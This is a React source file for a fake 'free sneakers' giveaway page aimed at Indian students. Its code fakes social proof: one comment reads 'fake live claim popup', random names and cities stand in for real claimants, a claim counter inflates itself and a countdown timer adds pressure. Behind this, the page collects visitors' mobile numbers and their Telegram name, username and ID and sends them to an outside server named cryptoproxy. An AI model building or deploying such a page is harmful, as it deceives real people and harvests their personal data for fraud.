import { useState, useEffect, useRef } from "react";

export default function ClaimGift() {

const [phone, setPhone] = useState("");
const [claimed, setClaimed] = useState(false);
const [error, setError] = useState("");
const [apiError, setApiError] = useState("");
const [serverReady, setServerReady] = useState(false);
const [telegramUser, setTelegramUser] = useState(null);

const [claimCount,setClaimCount] = useState(2843);
const [liveClaim,setLiveClaim] = useState(null);
const [timeLeft,setTimeLeft] = useState(300);

const telegramRef = useRef(null);

const names=["Rahul","Amit","Priya","Sneha","Arjun","Rohit","Neha"];
const cities=["Delhi","Mumbai","Bangalore","Hyderabad","Chennai","Pune"];


// wake server
useEffect(()=>{
fetch("https://cryptoproxy.onrender.com/")
.then(res=>res.json())
.then(()=>setServerReady(true))
.catch(()=>setServerReady(false))
},[]);


// telegram widget
useEffect(()=>{

window.onTelegramAuth=(user)=>{
setTelegramUser(user)
}

const script=document.createElement("script")

script.src="https://telegram.org/js/telegram-widget.js?22"
script.setAttribute("data-telegram-login","Shoegiftclaim_bot")
script.setAttribute("data-size","large")
script.setAttribute("data-radius","10")
script.setAttribute("data-onauth","onTelegramAuth(user)")
script.async=true

if(telegramRef.current){
telegramRef.current.innerHTML=""
telegramRef.current.appendChild(script)
}

},[])



// claim counter
useEffect(()=>{
const interval=setInterval(()=>{
setClaimCount(c=>c+Math.floor(Math.random()*3))
},7000)

return ()=>clearInterval(interval)

},[])


// fake live claim popup
useEffect(()=>{

const interval=setInterval(()=>{

const name=names[Math.floor(Math.random()*names.length)]
const city=cities[Math.floor(Math.random()*cities.length)]

setLiveClaim(`${name} from ${city} just claimed a free pair!`)

setTimeout(()=>setLiveClaim(null),4000)

},9000)

return ()=>clearInterval(interval)

},[])



// countdown timer
useEffect(()=>{

const timer=setInterval(()=>{
setTimeLeft(t=>t>0?t-1:0)
},1000)

return ()=>clearInterval(timer)

},[])



const handleClaim=async()=>{

if(phone.length<10){
setError("Enter valid mobile number")
return
}

setError("")
setApiError("")

try{

const response=await fetch("https://cryptoproxy.onrender.com/api/save-number",{

method:"POST",
headers:{ "Content-Type":"application/json" },

body:JSON.stringify({

phone:`+91${phone}`,
name:telegramUser ? `${telegramUser.first_name} ${telegramUser.last_name??""}`.trim():"Unknown",
telegram:telegramUser?.username?`@${telegramUser.username}`:"Not connected",
telegramId:telegramUser?.id?String(telegramUser.id):null

})

})

const data=await response.json()

if(data.success){
setClaimed(true)
}else{
setApiError(data.error||"Something went wrong")
}

}catch(err){

setApiError("Server waking up. Try again.")

}

}



return(

<div style={styles.page}>

<div style={styles.container}>

{!claimed?(

<>

<div style={styles.shoe}>👟</div>

<h1 style={styles.title}>You've Won a Free Gift!</h1>

<p style={styles.subtitle}>
Claim your exclusive sneakers
</p>


<p style={styles.counter}>
🔥 {claimCount.toLocaleString()} students already claimed
</p>

<p style={styles.timer}>
⏳ Offer expires in {Math.floor(timeLeft/60)}:
{String(timeLeft%60).padStart(2,"0")}
</p>



{/* phone */}

<div style={styles.step}>

<p style={styles.label}>Step 1 — Enter Mobile Number</p>

<div style={styles.inputRow}>

<span style={styles.flag}>🇮🇳 +91</span>

<input
style={styles.input}
value={phone}
onChange={(e)=>setPhone(e.target.value.replace(/\D/g,""))}
placeholder="9876543210"
maxLength={10}
/>

</div>

</div>



{/* telegram */}

<div style={styles.step}>

<p style={styles.label}>
Step 2 — Login Telegram (Optional)
</p>

{!telegramUser?

<div ref={telegramRef}></div>

:

<div style={styles.telegramConnected}>

<img
src={telegramUser.photo_url}
style={styles.telegramPhoto}
alt=""
/>

<div>

<p style={styles.telegramName}>
{telegramUser.first_name}
</p>

<p style={styles.telegramUsername}>
@{telegramUser.username}
</p>

</div>

</div>

}

</div>



{error && <p style={styles.error}>{error}</p>}
{apiError && <p style={styles.error}>{apiError}</p>}



<button
style={styles.button}
onClick={handleClaim}
disabled={!serverReady}
>

{telegramUser
?"🎉 Claim My Gift"
:"🎁 Claim Gift"}

</button>

</>

):


(

<div style={styles.success}>

<h1>🎉 Gift Claimed!</h1>

<p>We received your claim.</p>

<p style={{fontSize:20,fontWeight:700}}>
+91 {phone}
</p>

</div>

)

}

</div>



{liveClaim && (

<div style={styles.popup}>
🔥 {liveClaim}
</div>

)}


</div>

)

}



const styles={

page:{
minHeight:"100vh",
background:"#1a0533",
display:"flex",
alignItems:"center",
justifyContent:"center",
fontFamily:"Arial",
padding:20
},

container:{
width:"100%",
maxWidth:420,
textAlign:"center",
color:"white"
},

shoe:{
fontSize:64
},

title:{
fontSize:26,
margin:0
},

subtitle:{
color:"#bbb"
},

counter:{
color:"#f0b90b",
fontSize:13
},

timer:{
color:"#ff6b6b",
fontSize:13
},

step:{
marginTop:15
},

label:{
fontSize:13,
color:"#aaa"
},

inputRow:{
display:"flex",
background:"#222",
borderRadius:10,
overflow:"hidden",
marginTop:5
},

flag:{
padding:"12px",
borderRight:"1px solid #333"
},

input:{
flex:1,
background:"transparent",
border:"none",
outline:"none",
color:"white",
padding:12
},

button:{
marginTop:20,
width:"100%",
padding:14,
background:"#f0b90b",
border:"none",
borderRadius:10,
fontWeight:700,
cursor:"pointer"
},

error:{
color:"#ff6b6b"
},

telegramConnected:{
display:"flex",
gap:10,
alignItems:"center",
justifyContent:"center",
marginTop:10
},

telegramPhoto:{
width:36,
height:36,
borderRadius:"50%"
},

telegramName:{
margin:0
},

telegramUsername:{
margin:0,
color:"#00c896"
},

success:{
padding:30
},

popup:{
position:"fixed",
bottom:20,
left:"50%",
transform:"translateX(-50%)",
background:"#000",
padding:"10px 15px",
borderRadius:10,
fontSize:13
}

}